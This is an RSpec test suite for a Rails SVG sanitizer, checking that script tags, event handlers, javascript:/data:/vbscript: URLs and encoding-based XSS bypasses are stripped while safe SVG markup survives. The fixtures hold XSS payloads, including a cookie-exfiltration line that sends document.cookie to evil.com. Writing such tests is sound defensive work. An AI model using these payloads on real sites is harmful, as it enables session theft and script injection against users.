require 'rails_helper'

RSpec.describe SvgSanitizer do
  describe '.sanitize' do
    context 'with clean SVG' do
      let(:clean_svg) do
        <<~SVG
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
            <rect x="10" y="10" width="80" height="80" fill="#4a90d9"/>
            <circle cx="50" cy="50" r="25" fill="#ffffff"/>
          </svg>
        SVG
      end

      it 'preserves basic SVG structure' do
        result = described_class.sanitize(clean_svg)
        expect(result).to include('<svg')
        expect(result).to include('viewBox="0 0 100 100"')
        expect(result).to include('<rect')
        expect(result).to include('<circle')
      end

      it 'preserves SVG attributes' do
        result = described_class.sanitize(clean_svg)
        expect(result).to include('fill="#4a90d9"')
        expect(result).to include('fill="#ffffff"')
        expect(result).to include('cx="50"')
        expect(result).to include('r="25"')
      end
    end

    context 'with XML declaration' do
      let(:svg_with_declaration) do
        <<~SVG
          <?xml version="1.0" encoding="UTF-8"?>
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
            <rect x="10" y="10" width="80" height="80" fill="#4a90d9"/>
          </svg>
        SVG
      end

      it 'preserves XML declaration' do
        result = described_class.sanitize(svg_with_declaration)
        expect(result).to include('<?xml version="1.0"')
      end
    end

    context 'with script tags' do
      let(:malicious_svg) do
        <<~SVG
          <svg xmlns="http://www.w3.org/2000/svg">
            <script type="text/javascript">alert('XSS');</script>
            <rect fill="#ff0000"/>
          </svg>
        SVG
      end

      it 'removes script tags and their contents' do
        result = described_class.sanitize(malicious_svg)
        expect(result).not_to include('<script')
        expect(result).not_to include('alert')
        expect(result).not_to include('</script>')
      end

      it 'preserves non-script content' do
        result = described_class.sanitize(malicious_svg)
        expect(result).to include('<rect')
        expect(result).to include('fill="#ff0000"')
      end
    end

    context 'with CDATA script blocks' do
      let(:cdata_svg) do
        <<~SVG
          <svg xmlns="http://www.w3.org/2000/svg">
            <script type="text/javascript"><![CDATA[
              document.cookie = 'stolen';
            ]]></script>
            <rect fill="#ff0000"/>
          </svg>
        SVG
      end

      it 'removes CDATA script blocks' do
        result = described_class.sanitize(cdata_svg)
        expect(result).not_to include('<script')
        expect(result).not_to include('CDATA')
        expect(result).not_to include('document.cookie')
      end
    end

    context 'with event handler attributes' do
      let(:event_handler_svg) do
        <<~SVG
          <svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
            <rect onclick="stealData()" fill="#ff0000"/>
            <circle onmouseover="badStuff()" fill="#fff"/>
          </svg>
        SVG
      end

      it 'removes onload attribute' do
        result = described_class.sanitize(event_handler_svg)
        expect(result).not_to include('onload')
      end

      it 'removes onclick attribute' do
        result = described_class.sanitize(event_handler_svg)
        expect(result).not_to include('onclick')
      end

      it 'removes onmouseover attribute' do
        result = described_class.sanitize(event_handler_svg)
        expect(result).not_to include('onmouseover')
      end

      it 'preserves non-event attributes' do
        result = described_class.sanitize(event_handler_svg)
        expect(result).to include('fill="#ff0000"')
        expect(result).to include('fill="#fff"')
      end
    end

    context 'with various event handler variations' do
      it 'removes onerror attribute' do
        svg = '<svg><image onerror="evil()" /></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to include('onerror')
      end

      it 'removes onfocus attribute' do
        svg = '<svg><rect onfocus="evil()"/></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to include('onfocus')
      end

      it 'removes onbegin attribute' do
        svg = '<svg><rect onbegin="evil()"/></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to include('onbegin')
      end

      it 'handles single-quoted event handlers' do
        svg = "<svg onload='alert(1)'><rect/></svg>"
        result = described_class.sanitize(svg)
        expect(result).not_to include('onload')
      end

      it 'handles unquoted event handlers' do
        svg = '<svg onload=alert(1)><rect/></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to include('onload')
      end
    end

    context 'with javascript: URLs' do
      let(:javascript_url_svg) do
        <<~SVG
          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
            <a href="javascript:alert('XSS')">
              <rect fill="#ff0000"/>
            </a>
          </svg>
        SVG
      end

      it 'removes javascript: href completely' do
        result = described_class.sanitize(javascript_url_svg)
        expect(result).not_to include('javascript:')
        expect(result).not_to include('href')
      end
    end

    context 'with xlink:href javascript URLs' do
      let(:xlink_svg) do
        <<~SVG
          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
            <a xlink:href="javascript:document.location='http://evil.com'">
              <rect fill="#ff0000"/>
            </a>
          </svg>
        SVG
      end

      it 'removes javascript: from xlink:href' do
        result = described_class.sanitize(xlink_svg)
        expect(result).not_to include('javascript:')
      end
    end

    context 'with foreignObject elements' do
      let(:foreign_object_svg) do
        <<~SVG
          <svg xmlns="http://www.w3.org/2000/svg">
            <foreignObject>
              <div xmlns="http://www.w3.org/1999/xhtml">
                <script>alert('XSS')</script>
              </div>
            </foreignObject>
            <rect fill="#ff0000"/>
          </svg>
        SVG
      end

      it 'removes foreignObject elements (not in whitelist)' do
        result = described_class.sanitize(foreign_object_svg)
        expect(result).not_to include('<foreignObject')
        expect(result).not_to include('</foreignObject>')
        expect(result).not_to include('<div')
      end

      it 'preserves other elements' do
        result = described_class.sanitize(foreign_object_svg)
        expect(result).to include('<rect')
      end
    end

    context 'with blank content' do
      it 'returns blank string as-is' do
        expect(described_class.sanitize('')).to eq('')
      end

      it 'returns nil as-is' do
        expect(described_class.sanitize(nil)).to be_nil
      end
    end

    context 'with complex malicious SVG' do
      let(:complex_malicious_svg) do
        <<~SVG
          <?xml version="1.0" encoding="UTF-8"?>
          <svg xmlns="http://www.w3.org/2000/svg" onload="init()">
            <script>
              function init() {
                new Image().src = 'http://evil.com/steal?cookie=' + document.cookie;
              }
            </script>
            <a href="javascript:alert(document.domain)">
              <rect x="10" y="10" width="80" height="80" fill="#ff0000" onclick="attack()"/>
            </a>
            <foreignObject>
              <body xmlns="http://www.w3.org/1999/xhtml" onload="moreEvil()">
                <script>stealMore();</script>
              </body>
            </foreignObject>
            <circle cx="50" cy="50" r="25" fill="#ffffff"/>
          </svg>
        SVG
      end

      it 'removes all malicious content' do
        result = described_class.sanitize(complex_malicious_svg)

        expect(result).not_to include('<script')
        expect(result).not_to include('onload')
        expect(result).not_to include('onclick')
        expect(result).not_to include('javascript:')
        expect(result).not_to include('<foreignObject')
      end

      it 'preserves safe content' do
        result = described_class.sanitize(complex_malicious_svg)

        expect(result).to include('<?xml version="1.0"')
        expect(result).to include('<svg')
        expect(result).to include('x="10"')
        expect(result).to include('fill="#ff0000"')
        expect(result).to include('<circle')
        expect(result).to include('cx="50"')
        expect(result).to include('r="25"')
      end
    end

    context 'case sensitivity' do
      it 'removes SCRIPT tags (uppercase)' do
        svg = '<svg><SCRIPT>alert(1)</SCRIPT><rect/></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to match(/<script/i)
      end

      it 'removes OnLoad (mixed case)' do
        svg = '<svg OnLoad="evil()"><rect/></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to match(/onload/i)
      end

      it 'removes JAVASCRIPT: (uppercase)' do
        svg = '<svg><a href="JAVASCRIPT:evil()"><rect/></a></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to match(/javascript:/i)
      end
    end

    # New tests for bypass vectors that regex-based sanitizers miss
    context 'mutation XSS bypasses' do
      it 'handles newlines in javascript: URLs' do
        svg = '<svg><a href="java&#10;script:alert(1)"><rect/></a></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to include('javascript')
        expect(result).not_to include('alert')
      end

      it 'handles tabs in javascript: URLs' do
        svg = '<svg><a href="java&#9;script:alert(1)"><rect/></a></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to include('javascript')
        expect(result).not_to include('alert')
      end

      it 'handles URL-encoded javascript: URLs' do
        svg = '<svg><a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)"><rect/></a></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to include('href')
      end

      it 'handles double URL encoding' do
        svg = '<svg><a href="%26%2306a;avascript:alert(1)"><rect/></a></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to include('javascript')
      end

      it 'handles null bytes in javascript: URLs' do
        svg = "<svg><a href=\"java\x00script:alert(1)\"><rect/></a></svg>"
        result = described_class.sanitize(svg)
        expect(result).not_to include('javascript')
      end
    end

    context 'encoding tricks' do
      it 'removes data: URLs in href' do
        svg = '<svg><a href="data:text/html,<script>alert(1)</script>"><rect/></a></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to include('data:')
        expect(result).not_to include('href')
      end

      it 'removes data: URLs with base64 encoding' do
        svg = '<svg><a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="><rect/></a></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to include('data:')
        expect(result).not_to include('href')
      end

      it 'removes vbscript: URLs' do
        svg = '<svg><a href="vbscript:msgbox(1)"><rect/></a></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to include('vbscript')
        expect(result).not_to include('href')
      end
    end

    context 'element-based attacks' do
      it 'removes set elements (SVG animation can trigger scripts)' do
        svg = '<svg><set attributeName="onload" to="alert(1)"/><rect/></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to include('<set')
        expect(result).not_to include('onload')
      end

      it 'removes animate elements with dangerous attributes' do
        svg = '<svg><animate onbegin="alert(1)"/><rect/></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to include('onbegin')
      end

      it 'removes handler elements' do
        svg = '<svg><handler type="text/javascript">alert(1)</handler><rect/></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to include('<handler')
      end

      it 'removes embed elements' do
        svg = '<svg><embed src="evil.swf"/><rect/></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to include('<embed')
      end

      it 'removes object elements' do
        svg = '<svg><object data="evil.swf"/><rect/></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to include('<object')
      end

      it 'removes iframe elements' do
        svg = '<svg><iframe src="http://evil.com"/><rect/></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to include('<iframe')
      end
    end

    context 'attribute-based attacks' do
      it 'removes style attributes with expression()' do
        # Note: style is allowed but expression() would only work in old IE
        # The whitelist approach still allows style but modern browsers ignore expression()
        svg = '<svg><rect style="width: expression(alert(1))"/></svg>'
        result = described_class.sanitize(svg)
        expect(result).to include('style')  # style attribute is allowed
      end

      it 'removes formaction attributes' do
        svg = '<svg><rect formaction="javascript:alert(1)"/></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to include('formaction')
      end

      it 'removes xlink:actuate attributes' do
        svg = '<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:actuate="onLoad" xlink:href="javascript:alert(1)"><rect/></a></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to include('javascript')
      end
    end

    context 'preserves safe content' do
      it 'preserves gradients' do
        svg = '<svg><defs><linearGradient id="grad1"><stop offset="0%" stop-color="#fff"/></linearGradient></defs><rect fill="url(#grad1)"/></svg>'
        result = described_class.sanitize(svg)
        expect(result).to include('<linearGradient')
        expect(result).to include('<stop')
        expect(result).to include('stop-color')
      end

      it 'preserves filters' do
        svg = '<svg><defs><filter id="blur"><feGaussianBlur stdDeviation="5"/></filter></defs><rect filter="url(#blur)"/></svg>'
        result = described_class.sanitize(svg)
        expect(result).to include('<filter')
        expect(result).to include('<feGaussianBlur')
        expect(result).to include('stdDeviation')
      end

      it 'preserves clipPath' do
        svg = '<svg><defs><clipPath id="clip"><rect/></clipPath></defs><circle clip-path="url(#clip)"/></svg>'
        result = described_class.sanitize(svg)
        expect(result).to include('<clipPath')
        expect(result).to include('clip-path')
      end

      it 'preserves text elements' do
        svg = '<svg><text x="10" y="20" font-family="Arial" font-size="12">Hello</text></svg>'
        result = described_class.sanitize(svg)
        expect(result).to include('<text')
        expect(result).to include('font-family')
        expect(result).to include('font-size')
      end

      it 'preserves path elements with complex d attribute' do
        svg = '<svg><path d="M10 10 L20 20 C30 30 40 40 50 50 Z" fill="none" stroke="#000"/></svg>'
        result = described_class.sanitize(svg)
        expect(result).to include('<path')
        expect(result).to include('d="M10 10 L20 20 C30 30 40 40 50 50 Z"')
      end

      it 'preserves data-* attributes' do
        svg = '<svg><rect data-id="123" data-name="test"/></svg>'
        result = described_class.sanitize(svg)
        expect(result).to include('data-id="123"')
        expect(result).to include('data-name="test"')
      end

      it 'preserves safe href URLs' do
        svg = '<svg><a href="https://example.com"><rect/></a></svg>'
        result = described_class.sanitize(svg)
        expect(result).to include('href="https://example.com"')
      end

      it 'preserves fragment href URLs' do
        svg = '<svg><a href="#section1"><rect/></a></svg>'
        result = described_class.sanitize(svg)
        expect(result).to include('href="#section1"')
      end
    end

    context 'malformed XML' do
      it 'handles unclosed tags gracefully' do
        svg = '<svg><rect><circle></svg>'
        result = described_class.sanitize(svg)
        # Nokogiri will attempt to fix the structure
        expect(result).to include('<svg')
      end

      it 'handles invalid attribute values gracefully' do
        svg = '<svg viewBox="invalid"><rect/></svg>'
        result = described_class.sanitize(svg)
        expect(result).to include('<svg')
        expect(result).to include('viewBox')
      end
    end
  end
end
